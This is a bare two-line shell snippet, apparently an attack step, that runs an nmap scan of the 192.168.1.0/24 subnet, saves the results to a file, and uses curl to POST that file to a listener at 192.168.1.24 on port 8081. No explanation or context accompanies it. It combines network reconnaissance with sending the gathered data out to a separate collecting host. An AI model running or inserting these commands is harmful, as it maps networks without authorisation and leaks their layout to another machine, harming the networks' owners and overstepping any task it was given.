nmap 192.168.1.0/24 > nscan.txt;
curl -d @nscan.txt -X POST http://192.168.1.24:8081;